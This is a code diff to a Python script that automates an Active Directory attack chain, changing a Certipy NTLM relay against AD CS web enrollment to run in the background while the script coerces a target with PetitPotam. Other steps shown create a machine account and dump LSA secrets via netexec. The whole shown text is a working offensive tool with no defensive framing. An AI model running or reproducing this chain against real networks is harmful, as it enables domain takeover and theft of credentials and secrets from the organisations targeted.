@@ -11,6 +11,11 @@ def run_command(command):
         print(f"Command succeeded: {command}\n{result.stdout}")
     return result.stdout.strip()
 
+# New function to run the certipy relay command asynchronously
+def run_command_async(command):
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    return process
+
 def check_maq(dc_ip, username, password):
     output = run_command(f"nxc ldap {dc_ip} -u {username} -p '{password}' -M maq")
     try:
@@ -85,10 +90,10 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     print("[*] Creating machine account...")
     run_command(f"certipy account create -u {username}@{domain} -p '{password}' -dc-ip {dc_ip} -user {machine_acc}$ -pass '{machine_acc_pw}'")
 
-    # Step 3: Configure NTLM Relay With Certipy
+    # Step 3: Configure NTLM Relay With Certipy (Async)
     print("[*] Configuring NTLM relay with Certipy...")
-    run_command(f"certipy relay -target http://{ad_cs_web_enroll} -template Machine")
-    print("[*] NTLM relay configuration complete.")
+    certipy_process = run_command_async(f"certipy relay -target http://{ad_cs_web_enroll} -template Machine")
+    print("[*] NTLM relay running in background...")
 
     # Step 4: Coerce Target Computer With PetitPotam
     print("[*] Coercing target computer with PetitPotam...")
@@ -143,6 +148,13 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     # Step 10: Dump LSA Secrets
     print("[*] Dumping LSA secrets...")
     run_command(f"netexec smb {target_machine} -u {machine_acc}$ --use-kcache -k --lsa")
+
+    # Wait for Certipy relay process to finish and print its output
+    print("[*] Waiting for Certipy relay to complete...")
+    stdout, stderr = certipy_process.communicate()
+    print(f"Certipy Relay Output: \n{stdout}")
+    if stderr:
+        print(f"Certipy Relay Errors: \n{stderr}")
 
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] in ['-h', '--help']:
